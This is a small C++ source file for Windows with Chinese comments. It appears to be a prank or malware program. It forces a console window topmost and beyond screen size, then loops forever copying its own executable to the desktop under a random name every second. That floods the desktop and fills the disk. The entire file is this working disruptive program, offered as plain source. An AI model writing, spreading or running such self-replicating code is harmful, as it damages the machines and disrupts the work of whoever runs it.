#include<stdio.h>
#include<iostream>
#include<Windows.h>
#include<shlobj.h>
#include<time.h>
using namespace std;
void FullScreen(){
    HWND hwnd=GetForegroundWindow();
    int x=GetSystemMetrics(SM_CXSCREEN)+300;
    int y=GetSystemMetrics(SM_CYSCREEN)+300;
    char setting[30];
    sprintf(setting,"mode con:cols=%d lines=%d",x,y);
    system(setting);
	SetWindowPos(hwnd,HWND_TOPMOST,-10,-40,x+300,y+300,NULL);
    MoveWindow(hwnd,-10,-40,x+300,y+300,1);
    printf("\n\n");
}
void Reproduce(){
	char name_str[100] = {};
	int name;
	srand((unsigned)time(NULL));   // 随机数种子
	name = rand() % 102408;
	_itoa(name, name_str, 22);	   // 将随机数转化成字符串
	
	TCHAR szpath[MAX_PATH];

	char target[100] = {};
	TCHAR Destop[MAX_PATH];

	GetModuleFileName(NULL, szpath, MAX_PATH);	                 // 获取当前执行程序的路径
	SHGetSpecialFolderPath(NULL, Destop, CSIDL_DESKTOP, FALSE);	 // 获取桌面绝对路径

	strcat(target, Destop);
	strcat(target, "\\");
	strcat(target, name_str);
	strcat(target, ".exe");
	CopyFile(szpath, target, FALSE);
	Sleep(1000); 
}

int main(int argc, char* argv[]){
	cout<<"看这里"<<endl;
	cout<<"					□"; 
	FullScreen();
	while(2>1){
		Reproduce();
	}
	system("pause");
	return 0;
}

